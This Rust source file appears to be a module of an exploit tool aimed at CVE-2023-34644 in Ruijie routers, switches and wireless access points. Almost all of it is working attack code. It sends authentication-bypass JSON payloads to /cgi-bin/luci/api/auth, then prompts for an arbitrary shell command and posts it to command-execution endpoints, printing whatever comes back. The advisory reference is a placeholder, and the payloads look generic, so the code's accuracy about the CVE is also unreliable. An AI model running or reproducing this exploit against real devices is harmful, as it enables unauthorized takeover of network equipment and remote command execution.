use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// Ruijie RG-EW / RG-NBS / RG-S1930 Auth Bypass RCE (CVE-2023-34644)
/// 
/// Affects: RG-EW series home routers, RG-NBS/RG-S1930 switches,
///          RG-EG business VPN routers, EAP/RAP wireless APs
/// 
/// Allows remote attackers to gain escalated privileges via crafted
/// POST request to /cgi-bin/luci/api/auth
/// Reference: GitHub Advisory GHSA-xx

const TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_target = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    
    let normalized = normalize_target(&raw_target)?;
    let base_url = if normalized.contains("://") {
        normalized.clone()
    } else {
        format!("http://{}", normalized)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .build()?;
    
    // The vulnerability is in the auth endpoint - allows privilege escalation
    let auth_url = format!("{}/cgi-bin/luci/api/auth", base_url.trim_end_matches('/'));
    
    println!("{} Testing auth bypass at {}...", "[*]".blue(), auth_url);
    
    // Crafted payload to bypass authentication
    let bypass_payloads = vec![
        serde_json::json!({
            "method": "login",
            "params": {
                "username": "admin",
                "password": ""
            }
        }),
        serde_json::json!({
            "method": "do",
            "params": {
                "operation": "set",
                "data": {"username": "admin"}
            }
        }),
        serde_json::json!({
            "method": "exec",
            "params": {"cmd": "id"}
        }),
    ];
    
    for (i, payload) in bypass_payloads.iter().enumerate() {
        println!("{} Trying payload variant {}...", "[*]".dimmed(), i + 1);
        
        match client.post(&auth_url).json(payload).send().await {
            Ok(resp) => {
                let status = resp.status();
                let text = resp.text().await.unwrap_or_default();
                
                // Look for signs of successful bypass
                if text.contains("token") || text.contains("session") || 
                   text.contains("uid=") || text.contains("\"result\":0") ||
                   text.contains("admin") && !text.contains("error") {
                    println!("{} Auth bypass successful!", "[+]".green().bold());
                    println!("{} Response: {}", "[*]".blue(), &text[..text.len().min(500)]);
                    println!("{} Device may be VULNERABLE to CVE-2023-34644!", "[VULN]".red().bold());
                    
                    // Attempt to get a shell command executed
                    let cmd = prompt_default("Command to execute (or 'skip')", "id")?;
                    if cmd != "skip" {
                        attempt_rce(&client, &base_url, &cmd).await;
                    }
                    return Ok(());
                }
                
                if status.is_success() {
                    println!("{} HTTP {} - Response: {}", "[*]".yellow(), status, &text[..text.len().min(200)]);
                }
            },
            Err(e) => {
                println!("{} Request failed: {}", "[-]".red(), e);
            }
        }
    }
    
    println!();
    println!("{} Could not confirm auth bypass.", "[*]".yellow());
    println!("{} Target may be patched or different firmware version.", "[*]".cyan());
    
    Ok(())
}

async fn attempt_rce(client: &Client, base_url: &str, cmd: &str) {
    println!("{} Attempting RCE...", "[*]".blue());
    
    let rce_endpoints = vec![
        format!("{}/cgi-bin/luci/api/cmd", base_url.trim_end_matches('/')),
        format!("{}/goform/execCommand", base_url.trim_end_matches('/')),
    ];
    
    let payload = serde_json::json!({
        "method": "exec",
        "params": {"cmd": cmd}
    });
    
    for endpoint in &rce_endpoints {
        if let Ok(resp) = client.post(endpoint).json(&payload).send().await {
            let text = resp.text().await.unwrap_or_default();
            if !text.is_empty() {
                println!("{} RCE Response from {}:", "[*]".blue(), endpoint);
                println!("{}", text);
            }
        }
    }
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Ruijie Multi-Product Auth Bypass RCE (CVE-2023-34644)   ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
